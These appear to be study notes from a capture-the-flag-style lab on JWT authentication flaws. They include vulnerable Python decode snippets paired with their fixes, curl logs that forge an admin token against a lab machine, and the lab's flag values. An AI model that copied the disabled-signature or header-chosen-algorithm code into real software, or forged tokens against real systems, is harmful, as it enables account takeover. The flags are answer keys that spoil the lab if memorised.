## The Rise of APIs

### 1. What are APIs and why they are popular

- **APIs (Application Programming Interfaces)** allow one backend to serve **multiple clients** (web apps, mobile apps, etc.).
- Business logic is **centralized** on the server and reused across platforms.
- From a **security perspective**, protecting one API protects all connected interfaces.

---
### 2. Session Management Problem with APIs

- Traditional **cookie-based authentication** works well in browsers but **not across different clients** (mobile apps, tools, scripts).
- APIs need a **client-agnostic** authentication method.
- This led to **token-based session management**.

---
### 3. Token-Based Session Management

- After login, the server sends a **token** instead of a cookie.
- The token is:
    - Stored on the **client side** (e.g., browser LocalStorage).
    - Manually attached to each request using headers.
- Common standard:
    - **JWT (JSON Web Token)**
    - Sent in header:

```
Authorization: Bearer <JWT>
```

Since cookies are not used, **developers control everything**, which can lead to **security mistakes** if not done properly.

---
### 4. API Project Overview

- The API is built using **Python Flask**.
- Each challenge uses the endpoint:
    `http://MACHINE_IP/api/v1.0/exampleX`
- `X` represents the example number.    

---
### 5. API Endpoints & Methods

- **POST request**
    - Used for authentication.
    - Sends credentials as JSON.
    - Returns a JWT token.
- **GET request**
    - Used to retrieve user details.
    - Requires a valid JWT in the Authorization header.

---

### 6. API Authentication Credentials

- Credentials are sent in JSON format:

```
{
  "username": "user",
  "password": "passwordX"
}
```
- `X` changes based on the example number.

---
### 7. cURL Usage

**Login (POST request):**

```
curl -H "Content-Type: application/json" \
-X POST \
-d '{ "username":"user", "password":"passwordX" }' \
http://MACHINE_IP/api/v1.0/exampleX
```

Access protected resource (GET request):

```
curl -H "Authorization: Bearer <JWT>" \
http://MACHINE_IP/api/v1.0/exampleX?username=Y
```
---
## JWTs (JSON Web Tokens)

### 1. What is a JWT

- **Self-contained token** used to securely transmit session information.
- **Open standard**: can be used by any developer or library.
- Can be verified without server-side session storage (stateless authentication).

---
### 2. JWT Structure

A JWT consists of **three Base64Url-encoded parts**, separated by dots:

1. **Header**
    - Contains the **token type** (usually JWT)
    - Contains the **signing algorithm** (e.g., HS256, RS256)
2. **Payload**
    - Contains **claims** (pieces of information about an entity)
    - **Registered claims**: predefined by the JWT standard
    - **Public & private claims**: defined by developers
3. **Signature**
    - Verifies token authenticity
    - Created using the **algorithm specified in the header**
    - Ensures payload and header are **not tampered with**

---
### 3. JWT Signing Algorithms

1. **None**
    - No signature
    - JWT claims cannot be verified
    - Not secure
2. **Symmetric (e.g., HS256)**
    - Uses **same secret key** for signing and verification
    - Signature = Hash(header + payload + secret)
    - All parties must know the secret
3. **Asymmetric (e.g., RS256)**
    - Uses **private key** to sign, **public key** to verify
    - Signature = Hash(header + payload) encrypted with private key
    - Verification possible by anyone with public key    

---
### 4. Security & Usage

- JWTs can also be **encrypted** (JWEs), but the **signature** is the main security feature.
- Enables **centralized authentication server**:
    - Server issues signed JWT
    - Client can use it on multiple applications
    - Each application verifies signature → trusts the claims
- JWTs are **stateless**: server doesn’t need to store sessions.

---
### Sensitive Information Disclosure

In PHP, for example, you can use $SESSION['var']=data to store a value associated with the user's session. These values are not exposed client-side and can therefore only be recovered server-side. However, with tokens, the claims are exposed as the entire JWT is sent client-side. If the same development practice is followed, sensitive information can be disclosed. Some examples are seen on real applications:

- Credential disclosure with the password hash, or even worse, the clear-text password being sent as a claim.
- Exposure of internal network information such as the private IP or hostname of the authentication server.

```
ajdev@rootbox:~$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.49.170.207/api/v1.0/example1
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3N3b3JkMSIsImFkbWluIjowLCJmbGFnIjoiVEhNezljYzAzOWNjLWQ4NWYtNDVkMS1hYzNiLTgxOGM4MzgzYTU2MH0ifQ.TkIH_A1zu1mu-zu6_9w_R4FUlYadkyjmXWyD5sqWd5U"
}

# all the sensitive information is in jwt:

{
  "username": "user",
  "password": "password1",
  "admin": 0,
  "flag": "THM{9cc039cc-d85f-45d1-ac3b-818c8383a560}"
}
```

---
### Signature validation Mistake

The second common mistake with JWTs is not correctly verifying the signature. If the signature isn't correctly verified, a threat actor may be able to forge a valid JWT token to gain access to another user's account. 

```
# The Development Mistake

payload = jwt.decode(token, options={'verify_signature': False})

# the fix

payload = jwt.decode(token, self.secret, algorithms="HS256")
```

```
ajdev@rootbox:~$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.49.170.207/api/v1.0/example2
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"
}

# manipulation the jwt
{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "username": "admin",
  "admin": 1
}

ajdev@rootbox:~$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.SurGPm4eIK-v-gtvSzHAI6rEttfMA-2Q-Q2XyNFBAuM' http://10.49.170.207/api/v1.0/example2?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}"
}
```

---
### Downgrading to None

Another common issue is a signature algorithm downgrade. JWTs support the `None` signing algorithm, which effectively means that no signature is used with the JWT. While this may sound silly, the idea behind this in the standard was for server-to-server communication, where the signature of the JWT was verified in an upstream process. Therefore, the second server would not be required to verify the signature. However, suppose the developers do not lock in the signature algorithm or, at the very least, deny the `None` algorithm. In that case, you can simply change the algorithm specified in your JWT as `None`, which would then cause the library used for signature verification to always return true, thus allowing you again to forge any claims within your token.

**The Development Mistake**

```
Sometimes, developers want to ensure their implementation accepts several JWT signature verification algorithms.

header = jwt.get_unverified_header(token)

signature_algorithm = header['alg']

payload = jwt.decode(token, self.secret, algorithms=signature_algorithm)

However, when the threat actor specified `None` as the algorithm, signature verification is bypassed.[](https://pyjwt.readthedocs.io/en/stable/)
```

**The Fix**

```
If multiple signature algorithms should be supported, the supported algorithms should be supplied to the decode function as an array list, as shown below:

payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])

username = payload['username']
flag = self.db_lookup(username, "flag")
```






---
### Weak Symmetric Secrets

If a symmetric signing algorithm is used, the security of the JWT relies on the strength and entropy of the secret used. If a weak secret is used, it may be possible to perform offline cracking to recover the secret. Once the secret value is known, you can again alter the claims in your JWT and recalculate a valid signature using the secret.

the development mistake: The issue occurs when a weak JWT secret is used. This can often occur when developers are in a hurry or copy code from examples.

the fix: A secure secret value should be selected. As this value will be used in software and not by humans, a long, random string should be used for the secret.






